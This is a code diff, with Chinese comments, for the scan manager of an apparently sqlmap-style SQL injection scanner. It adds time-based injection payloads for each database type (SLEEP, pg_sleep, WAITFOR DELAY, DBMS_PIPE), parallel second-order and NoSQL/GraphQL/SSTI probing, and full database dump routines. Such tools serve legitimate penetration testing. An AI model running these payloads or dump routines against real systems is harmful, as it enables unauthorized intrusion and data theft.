+  async _prefilterPoints(ctxBase, target, points) {
+    const cfg = ctxBase.config || {};
+    if (target.mode === 'direct' || !points || points.length === 0) return points || [];
+    const httpClient = ctxBase.httpClient;
+    const skipIds = new Set();
+    const prefilterCtx = { ...ctxBase, target };
+    const sleepSec = cfg.timeBlindSleepSec ?? defaults.timeBlindSleepSec ?? 2;
+    // [P1-FIX 2026-09-05] 动态预算：原固定 120ms 在公网（RTT>120ms）下探测必超时 → 全部保守
+    // 保留 → 预筛选空转。改为：目标基线 RTT 实测（共享 1 次）→ 预算 = clamp(3×RTT+150, 300, 2000)。
+    // 基线测不通（不可达）→ 直接跳过预筛（保守保留全部，与旧超时行为一致但零白费请求）。
+    // 手动 cfg.prefilterBudgetMs 仍最高优先（不测基线，保持确定性）。
+    let budgetMs = Number.isFinite(cfg.prefilterBudgetMs) && cfg.prefilterBudgetMs > 0
+      ? cfg.prefilterBudgetMs
+      : null;
+    if (budgetMs == null) {
+      const rtt = await this._probeBaselineRttMs(httpClient, prefilterCtx, target, points[0]);
+      if (rtt == null) {
+        logger.info('预筛选基线测量失败（目标不可达/超时），跳过预筛选，保守保留全部注入点');
+        return points;
       }
-      s.oobStarted = false;
+      budgetMs = Math.min(2000, Math.max(300, Math.round(rtt * 3 + 150)));
     }
-    // 取消已存在的淘汰定时器（防止重复排定）
-    const prev = this._evictTimers.get(scanId);
-    if (prev) clearTimeout(prev);
-    const timer = setTimeout(() => this._evictScan(scanId), this.scanRetentionMs);
-    if (typeof timer.unref === 'function') timer.unref(); // 不阻塞 Node 进程退出
-    this._evictTimers.set(scanId, timer);
-    this._enforceScanLimit();
+    // 时间向量信号下限：绝对秒级延迟余量（≈0.5-0.9s），宽于检测阈值，保守兜住真实 sleep
+    const timeFloorMs = Math.max(800, (cfg.timeThresholdMs ?? defaults.timeThresholdMs) * 0.6);
+    // [P1-FIX 2026-09-05] 时间探针按 dbms 选族（原硬编码 MySQL SLEEP：非 MySQL 目标必然
+    // 语法错误无延时信号 → 预筛漏剪时间型注入点）。未知库发 MySQL+PG 双族覆盖最常见两系。
+    const dbms = cfg.dbms || target?.config?.dbms || target.dbms || ctxBase.dbms || null;
+    const timeProbeValues = this._timeProbeValues(dbms, sleepSec);
+    // [MERGED: perf] 请求治理：旧实现 Promise.all(points.map(...)) 对全部点 × 3 探测并发（无上限）；
+    // 且探测经令牌桶排队，预算内放不完时 Promise.race 返回 null → 保守全保留，
+    // 但已排队的探测请求仍会发出（结果被丢弃）→ 白费 3×N 请求。本版：
+    //   1) 仅当全部探测（N×(2+时间探针数)）可在「初始满桶突发 + 预算窗口」内放行时才预筛（限速过低直接跳过，零白费请求）；
+    //   2) 点级并发经 _mapPool 限到 4，避免无上限并发放大突发。
+    const ratePerSec = Number.isFinite(cfg.ratePerSec) && cfg.ratePerSec > 0 ? cfg.ratePerSec : defaults.ratePerSec;
+    const totalProbes = points.length * (2 + timeProbeValues.length);
+    const servableInBudget = ratePerSec + (budgetMs / 1000) * ratePerSec;
+    if (totalProbes > servableInBudget) {
+      logger.info(
+        `预筛选预算不足（${points.length} 点 × 3 探测 = ${totalProbes} 请求 > 限速 ${ratePerSec}/s × ~${(budgetMs / 1000).toFixed(2)}s 可放行 ${Math.floor(servableInBudget)}），跳过预筛选避免白费请求`
+      );
+      return points;
+    }
+    // 点级并发限 4（12 个并发探测）：与调度并发对齐，避免 points×3 无上限并发
+    await this._mapPool(
+      points,
+      async (point) => {
+        const orig = point.originalValue || '1';
+        const probe = (value) => {
+          const req = buildInjectionRequest(target, point, value);
+          const t0 = Date.now();
+          // 预筛选探测用短超时 + 零重试：慢/不可达目标（DNS 慢、页面慢）快速放弃并保守保留。
+          // 短超时会取消底层请求（含 DNS 解析），不残留后台请求占住事件循环（测试/慢目标友好）。
+          return sendInjection(httpClient, prefilterCtx, req, { timeoutMs: budgetMs, retry: 0 }).then(
+            (res) => ({ res, elapsed: Date.now() - t0 })
+          );
+        };
+        try {
+          // 基线 + 单引号报错 + 时间向量（按 dbms 选族）并行，整体受预算竞速约束：墙钟≈单次 RTT
+          const probes = [probe(orig), probe(`${orig}'`), ...timeProbeValues.map((v) => probe(`${orig}${v}`))];
+          const trio = await Promise.race([
+            Promise.all(probes),
+            new Promise((resolve) => setTimeout(() => resolve(null), budgetMs)),
+          ]);
+          if (!trio) return; // 预算超时：无法判定 → 保守保留
+          const [base, quote, ...timed] = trio;
+          // 保守：任一探测失败（网络错误/超时）→ 保留做完整检测，绝不因探测失败漏检
+          if (!base || base.res == null || !quote || quote.res == null) return;
+          if (timed.some((t) => !t || t.res == null)) return;
+          // 探测① 单引号报错：闭合破坏 → 报错/空页/500 → 响应明显偏离基线 → 可疑保留
+          const baseBody = String(base.res?.data ?? '');
+          const baseStatus = base.res?.status ?? null;
+          const quoteBody = String(quote.res?.data ?? '');
+          const quoteStatus = quote.res?.status ?? null;
+          if (!this._prefilterSimilar(baseBody, baseStatus, quoteBody, quoteStatus)) return;
+          // 探测② 时间向量：任一族探针耗时明显高于绝对下限 → 触发延迟 → 保留
+          if (timed.some((t) => t.elapsed >= timeFloorMs)) return;
+          // 两探皆无信号 → 判为无注入迹象，跳过完整检测
+          skipIds.add(point.id);
+        } catch {
+          // 探测异常（如 URL 构造失败）→ 保守保留
+        }
+      },
+      4 // [MERGED: perf] 点级并发上限
+    );
+    return points.filter((p) => !skipIds.has(p.id));
   }
 
-  // 从内存淘汰某次扫描快照（completed/error/stopped 才可删除；running 保留）
-  _evictScan(scanId) {
-    this._evictTimers.delete(scanId);
-    const s = this.scans.get(scanId);
-    if (!s || s.status === 'running') return;
-    this.scans.delete(scanId);
-    eventBus.dispose(scanId); // 清理事件命名空间，避免 EventEmitter 泄漏
+  // [P1-FIX 2026-09-05] 基线 RTT 实测（预筛选共享 1 次）：注入原值的单次请求耗时。
+  // 失败/超时返回 null（调用方跳过预筛）。2s 上限防不可达目标拖慢流水线。
+  async _probeBaselineRttMs(httpClient, prefilterCtx, target, samplePoint) {
+    const point = samplePoint || null;
+    if (!point) return null;
+    try {
+      const t0 = Date.now();
+      const req = buildInjectionRequest(target, point, point.originalValue || '1');
+      const res = await sendInjection(httpClient, prefilterCtx, req, { timeoutMs: 2000, retry: 0 });
+      if (res == null) return null;
+      const elapsed = Date.now() - t0;
+      return Number.isFinite(elapsed) && elapsed >= 0 ? elapsed : null;
+    } catch {
+      return null;
+    }
   }
 
-  // 上限控制：超过 maxScans 时，按完成时间淘汰最旧的已完成/错误/停止扫描
-  _enforceScanLimit() {
-    const max = this.maxScans;
-    if (!(max > 0) || this.scans.size <= max) return;
-    const finished = [...this.scans.entries()]
-      .filter(([, v]) => v.status !== 'running' && v.report && v.report.finishedAt)
-      .sort((a, b) => new Date(a[1].report.finishedAt) - new Date(b[1].report.finishedAt));
-    while (this.scans.size > max && finished.length > 0) {
-      const [oldestId] = finished.shift();
-      this._evictScan(oldestId);
+  // [P1-FIX 2026-09-05] 时间探针按 dbms 选族（闭引号上下文，与原 MySQL SLEEP 样式一致）：
+  //   MySQL 族 → AND SLEEP(s)；PostgreSQL → AND pg_sleep(s) IS NULL；
+  //   SQL Server → '; WAITFOR DELAY（堆叠）；Oracle → DBMS_PIPE.RECEIVE_MESSAGE；
+  //   SQLite（无服务器端 sleep）→ 空数组，仅靠单引号报错探针；
+  //   未知库 → MySQL + PG 双族（覆盖公网最常见两系，语法错误在异构库上只会快速失败，无副作用）。
+  _timeProbeValues(dbms, sleepSec) {
+    const s = Number(sleepSec) || 2;
+    switch (String(dbms || '').toLowerCase()) {
+      case 'mysql': case 'mariadb': case 'tidb':
+        return [`' AND SLEEP(${s})-- -`];
+      case 'postgresql':
+        return [`' AND pg_sleep(${s}) IS NULL-- -`];
+      case 'sql server': case 'mssql':
+        return [`'; WAITFOR DELAY '0:0:${s}'--`];
+      case 'oracle': case 'dm8':
+        return [`' AND DBMS_PIPE.RECEIVE_MESSAGE('pf', ${s}) = 'pf'-- -`];
+      case 'sqlite':
+        return [];
+      default:
+        return [`' AND SLEEP(${s})-- -`, `' AND pg_sleep(${s}) IS NULL-- -`];
     }
+  }
+
+  // 预筛选相似判定（与 Detector._boundarySimilar 同思路的轻量内联，避免跨模块耦合）：
+  // 状态码一致 + 长度差在容差内 + 最长公共前缀 ≥ 85% → 视为「无报错信号」。
+  _prefilterSimilar(baseBody, baseStatus, body, status) {
+    if (status != null && baseStatus != null && status !== baseStatus) return false;
+    const la = baseBody.length;
+    const lb = body.length;
+    if (Math.abs(la - lb) > Math.max(24, Math.max(la, lb) * 0.12)) return false;
+    const m = Math.min(la, lb);
+    if (m === 0) return la === lb;
+    let common = 0;
+    while (common < m && baseBody[common] === body[common]) common++;
+    return common >= m * 0.85;
   }
 
   // 二阶注入补充趟：在既有一阶聚合之后运行，对"每个存储点 × 每个触发页"调用独立 SecondOrderDetector。
@@ -426,151 +582,142 @@ export class ScanManager {
   async _runSecondOrder(scanId, target, points, dbms) {
     const so = (target.config && target.config.secondOrder) || {};
     if (!so.enabled) return []; // 未启用：直接跳过，对目标零写
-    // 存储点来源：启发式 isStorePoint ∪ 手动指定（manualStorePoints 参数名列表）。
-    // 手动指定的点运行时把 isStorePoint 置真，使报告/拓扑的存储点高亮与一阶识别点一致。
-    const manualSet = new Set(Array.isArray(so.manualStorePoints) ? so.manualStorePoints : []);
-    if (manualSet.size > 0) {
-      for (const p of points) {
-        if (p && manualSet.has(p.param)) p.isStorePoint = true;
-      }
-    }
+    const triggerUrls = Array.isArray(so.triggerUrls) ? so.triggerUrls : [];
+    if (triggerUrls.length === 0) return []; // 无候选触发页：跳过
     const storePoints = points.filter((p) => p && p.isStorePoint);
-    if (storePoints.length === 0) return []; // 无存储点（含手动指定未命中任一参数）：跳过（发现器也需存储点才能确认触发页）
-
-    // 触发页来源：手动 triggerUrls 优先；autoDiscover 在 enabled 且未手填时自动发现并经哨兵确认。
-    // 注意：即便开启自动发现，也仅在"手填为空"时接管，避免覆盖用户显式指定的触发页。
-    let triggerUrls = Array.isArray(so.triggerUrls)
-      ? so.triggerUrls.filter((x) => typeof x === 'string' && /^https?:\/\//i.test(x))
-      : [];
-    if (so.autoDiscover && triggerUrls.length === 0) {
-      const disc = await this.secondOrderDiscovery.run({ target, config: target.config, storePoints });
-      triggerUrls = disc.confirmed;
-      // 落报告 + 推送事件（供前端展示"自动发现结果"）；scan 不存在时静默跳过
-      const storePointsLite = storePoints.map((p) => ({ param: p.param, storeKind: p.storeKind }));
-      const sc = this.scans.get(scanId);
-      if (sc) {
-        sc.report.summary = sc.report.summary || {};
-        sc.report.summary.secondOrderDiscovery = {
-          candidates: disc.candidates,
-          confirmed: disc.confirmed,
-          storePoints: storePointsLite,
-        };
-      }
-      eventBus.emit(scanId, 'second_order_discovery', {
-        candidates: disc.candidates,
-        confirmed: disc.confirmed,
-        storePoints: storePointsLite,
-      });
-    }
-    if (triggerUrls.length === 0) return []; // 无候选触发页（含自动发现无确认）：跳过
+    if (storePoints.length === 0) return []; // 无存储点：跳过
 
     // 告警：开启二阶检测即代表将对目标发起真实写请求（POST 注册/评论/资料）
     logger.warn(
       '二阶检测已开启：将对目标发起真实写请求（POST 注册/评论/资料），仅在你确认已授权目标时执行'
     );
 
-    const collected = [];
-    // 与一阶流水线一致：二阶趟也走扫描级 fork（独立限速/连接策略），避免污染全局单例
-    const ctxBase = { httpClient: this.httpClient.fork(target.config), config: target.config };
-    for (const point of storePoints) {
-      const pointDbms = dbms || point.dbms; // 复用一阶已识别的 dbms（若有时）
-      for (const triggerUrl of triggerUrls) {
-        const ctx = { ...ctxBase, target, point, dbms: pointDbms, triggerUrl };
-        try {
-          const result = await this.secondOrderDetector.detect(ctx);
-          if (result.vulnerable) {
-            // 复用既有聚合/风险纳管通道：先经 ReportGenerator.riskOf 定级（second_order → High）
-            const risk = this.reportGen.riskOf([
-              createVulnerability(point.id, 'second_order', 'Medium', result.payloads, result.evidence),
-            ]);
-            const vuln = createVulnerability(
-              point.id,
-              'second_order',
-              risk,
-              result.payloads,
-              result.evidence
-            );
-            vuln.dbms = result.dbms;
-            collected.push(vuln);
-            eventBus.emit(scanId, 'detection_found', { ...result, riskLevel: risk });
-          }
-        } catch (e) {
-          logger.warn(`二阶检测失败（点 ${point.id} / 触发页 ${triggerUrl}）：${e.message}`);
-        }
+    // 二阶 OOB 触发：oobTrigger 开启且 oob 启用时，确保带外接收端就绪（幂等；失败仅告警不阻断，
+    // 检测器侧会再以 OOB_DISABLED 拒绝未就绪分支，由下方 try/catch 捕获记录）
+    const oobCfg = (target.config && target.config.oob) || {};
+    if (so.oobTrigger === true && oobCfg.enabled) {
+      try {
+        await oobReceiver.start(oobCfg);
+      } catch (e) {
+        logger.warn(`二阶 OOB 接收端启动失败，OOB 触发判定将不可用：${e.message}`);
       }
     }
+
+    const collected = [];
+    const ctxBase = { httpClient: this._wrapWithSignal(scanId, this.getScanClient(scanId, target)), config: target.config };
+    // [MERGED: perf] 并发治理：旧实现双层 for 全串行（storePoints × triggerUrls 逐对 await），
+    // 10 存储点 × 3 触发页 = 30 次检测墙钟线性累加。现按「存储点」并行（_mapPool 限并发，
+    // 默认 2；同一存储点内触发页仍串行，避免并发写同一存储点相互污染读回判定）。
+    const concurrency = Math.max(1, Math.min(Number(so.concurrency) || 2, storePoints.length));
+    await this._mapPool(
+      storePoints,
+      async (point) => {
+        const pointDbms = dbms || point.dbms; // 复用一阶已识别的 dbms（若有时）
+        for (const triggerUrl of triggerUrls) {
+          const ctx = { ...ctxBase, target, point, dbms: pointDbms, triggerUrl, scanId };
+          try {
+            const result = await this.secondOrderDetector.detect(ctx);
+            if (result.vulnerable) {
+              // 复用既有聚合/风险纳管通道：先经 ReportGenerator.riskOf 定级（second_order → High）
+              const risk = this.reportGen.riskOf([
+                createVulnerability(point.id, 'second_order', 'Medium', result.payloads, result.evidence),
+              ]);
+              const vuln = createVulnerability(
+                point.id,
+                'second_order',
+                risk,
+                result.payloads,
+                result.evidence
+              );
+              vuln.dbms = result.dbms;
+              collected.push(vuln);
+              eventBus.emit(scanId, 'detection_found', { ...result, riskLevel: risk });
+            }
+          } catch (e) {
+            logger.warn(`二阶检测失败（点 ${point.id} / 触发页 ${triggerUrl}）：${e.message}`);
+          }
+        }
+      },
+      concurrency
+    );
+    await this._maybeClose(ctxBase.httpClient);
+    return collected;
+  }
+
+  // 非 SQL 注入补充趟（NoSQL/GraphQL/SSTI）：门控 noSql.enabled 才运行，默认关闭（opt-in）。
+  // 对一阶流水线零侵入：仅在启用时对每个注入点 × 每个类别（nosql/graphql/ssti）调用独立 NoSqlInjectionDetector。
+  // 命中复用既有聚合/风险纳管通道（technique 统一记为 'nosql'，报告层按 noSqlKind 细分展示）。
+  async _runNoSql(scanId, target, points, dbms) {
+    const noSql = (target.config && target.config.noSql) || {};
+    if (!noSql.enabled) return []; // 未启用：直接跳过，对目标零额外请求
+    const kinds = Array.isArray(noSql.kinds) && noSql.kinds.length ? noSql.kinds : ['nosql', 'graphql', 'ssti'];
+    const collected = [];
+    const ctxBase = { httpClient: this._wrapWithSignal(scanId, this.getScanClient(scanId, target)), config: target.config };
+    logger.info(`非SQL注入检测已开启（类别：${kinds.join('/')}），将对 ${points.length} 个注入点逐一探测`);
+    // [MERGED: perf] 并发治理：旧实现点 × 类别双层串行；现按「注入点」并行（_mapPool 限并发 2），
+    // 同一注入点内类别仍串行（探测表按成本升序命中即停的短路语义不变）。
+    const concurrency = Math.max(1, Math.min(Number(noSql.concurrency) || 2, points.length));
+    await this._mapPool(
+      points,
+      async (point) => {
+        for (const kind of kinds) {
+          const ctx = { ...ctxBase, target, point, dbms: dbms || point.dbms, noSqlKind: kind };
+          try {
+            const result = await this.noSqlDetector.detect(ctx);
+            if (result.vulnerable) {
+              const risk = this.reportGen.riskOf([
+                createVulnerability(point.id, 'nosql', 'Medium', result.payloads, result.evidence),
+              ]);
+              const vuln = createVulnerability(point.id, 'nosql', risk, result.payloads, result.evidence);
+              vuln.dbms = null;
+              vuln.noSqlKind = kind; // 透传细分类别（NoSQL/GraphQL/SSTI）
+              collected.push(vuln);
+              eventBus.emit(scanId, 'detection_found', { ...result, riskLevel: risk });
+            }
+          } catch (e) {
+            logger.warn(`非SQL注入检测失败（点 ${point.id} / 类别 ${kind}）：${e.message}`);
+          }
+        }
+      },
+      concurrency
+    );
+    await this._maybeClose(ctxBase.httpClient);
     return collected;
   }
 
   // 完整拖库（库→表→列→数据）
+  // extractScope 存在时（CLI --dbs/--tables/--columns/--dump/--current-db/--current-user/--count）
+  // 走 _extractByScope 定向枚举；否则保留既有全量拖库逻辑（零回归）。
   async _extract(scanId, ctx) {
-    const data = emptyExtractedData();
-    try {
-      const dbs = await this.extractor.enumerateDatabases(ctx);
-      data.databases = dbs;
-      // 库级并发拖库（受 dumpDatabaseConcurrency 约束），单库失败不影响整体
-      // UNION 提取失败时自动 fallback 到堆叠深度提取（deepDump），并统计走了 fallback 的表
-      const aggregated = await this.extractor.dumpAllDatabases(ctx, dbs, {
-        fallback: (c, db, table, cols) => this.exploiter.deepDump(c, db, table, cols),
-        onFallback: (t) => {
-          data.meta = data.meta || {};
-          (data.meta.deepDumpTables ||= []).push(t);
-        },
-      });
-      data.tables = aggregated.tables;
-      data.columns = aggregated.columns;
-      data.rows = aggregated.rows;
-      // 列类型枚举 + 进度推送（库数通常不多，保持串行遍历；类型枚举失败被吞）
-      for (const db of dbs) {
-        const tbls = aggregated.tables[db] || [];
-        eventBus.emit(scanId, 'extraction_progress', { db, table: null, count: tbls.length });
-        for (const table of tbls) {
-          const cols = aggregated.columns[`${db}.${table}`] || [];
-          data.columns[`${db}.${table}`] = cols;
-          if (this.colTypeEnum) {
-            const cacheKey = `${db}.${table}`;
-            try {
-              let typed = this._colTypeCache.get(cacheKey);
-              if (!typed) {
-                typed = await this.colTypeEnum.enumerate(ctx, db, table, cols);
-                this._colTypeCache.set(cacheKey, typed);
-              }
-              data.columns[cacheKey] = typed.map((c) => `${c.name}:${c.type}`);
-            } catch {
-              /* 类型枚举失败不影响主流程 */
-            }
-          }
-          const rowsArr = aggregated.rows[`${db}.${table}`] || [];
-          data.rows[`${db}.${table}`] = rowsArr;
-          eventBus.emit(scanId, 'extraction_progress', {
-            db,
-            table,
-            count: rowsArr.length,
-          });
-        }
-      }
-    } catch (e) {
-      logger.warn(`提取失败：${e.message}`);
-    }
-    return data;
+    return extractAll(this, scanId, ctx);
   }
 
+  // [P2] 委托 scanHelpers.mapPool
+  async _mapPool(items, fn, concurrency) {
+    return mapPool(items, fn, concurrency);
+  }
+
+  // [P2] 委托 scanHelpers.mergeExtracted
   _mergeExtracted(target, src) {
-    if (!src) return;
-    for (const db of src.databases) {
-      if (!target.databases.includes(db)) target.databases.push(db);
-    }
-    for (const [k, v] of Object.entries(src.tables)) target.tables[k] = v;
-    for (const [k, v] of Object.entries(src.columns)) target.columns[k] = v;
-    for (const [k, v] of Object.entries(src.rows)) target.rows[k] = v;
+    return mergeExtracted(target, src);
   }
 
+  // [P2] 委托 scanHelpers.mergeExtractedForResume
+  _mergeExtractedForResume(current, restored) {
+    return mergeExtractedForResume(current, restored);
+  }
+
+  // [P2] 委托 scanHelpers.hasData
   _hasData(data) {
-    return !!(
-      (data.databases && data.databases.length) ||
-      (data.tables && Object.keys(data.tables).length) ||
-      (data.rows && Object.keys(data.rows).length)
-    );
+    return hasData(data);
+  }
+
+  // 枚举模式提取（对标 sqlmap --dbs/--tables/--columns/--dump/--current-db/--current-user/--count）。
+  // extractScope = { mode, dbs?, tables?, cols?, excludeSysdbs? }
+  //   dbs/tables 为数组；cols 为逗号串或数组；excludeSysdbs 默认 true。
+  // 返回与 emptyExtractedData 同结构的对象（含 mode 专用字段 currentDb/currentUser/counts）。
+  async _extractByScope(scanId, ctx, scope) {
+    return extractByScope(this, scanId, ctx, scope);
   }
 }
 
